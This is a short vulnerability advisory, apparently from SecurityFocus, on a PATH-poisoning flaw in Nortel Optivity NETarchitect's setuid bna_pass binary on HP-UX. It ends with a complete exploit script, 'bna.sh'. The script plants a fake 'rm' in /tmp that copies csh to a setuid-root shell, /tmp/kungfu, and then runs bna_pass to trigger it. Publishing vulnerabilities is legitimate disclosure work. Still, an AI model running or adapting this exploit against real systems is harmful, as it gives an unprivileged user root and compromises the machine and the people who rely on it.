source: http://www.securityfocus.com/bid/907/info

NETarchitect is an application for simplifying the task of designing and deploying complex switched network system configurations, produced by Nortel Networks and usually shipped with the Optivity Network Configuration System suite of utilities. It is possible to gain root privileges on an HP-UX (possibly Solaris) system running NETarchitect by exploiting a path vulnerability in the binary /opt/bna/bin/bna_pass. bna_pass executes 'rm' assuming that the end user's PATH value is valid and the real rm binary is in the one being called.Because of this, it is possible to have bna_pass execute arbitrary binaries as root if the PATH variable is manipulated. A malicious user can add "." to his PATH environment variable and have binaries searched for and executed in . before any others [directories in PATH]. A false 'rm' would then be executed, compromising the system.

#!/bin/sh
#
# bna.sh - Loneguard 03/03/99
#
# Poision path xploit for Optivity NETarchitect on HPUX
#
cd /tmp
touch /usr/bna/tmp/.loginChk
PATH=.:$PATH;export PATH
cat > rm << _EOF
#!/bin/sh
cp /bin/csh /tmp/kungfu
chmod 4755 /tmp/kungfu
_EOF
chmod 755 /tmp/rm
/opt/bna/bin/bna_pass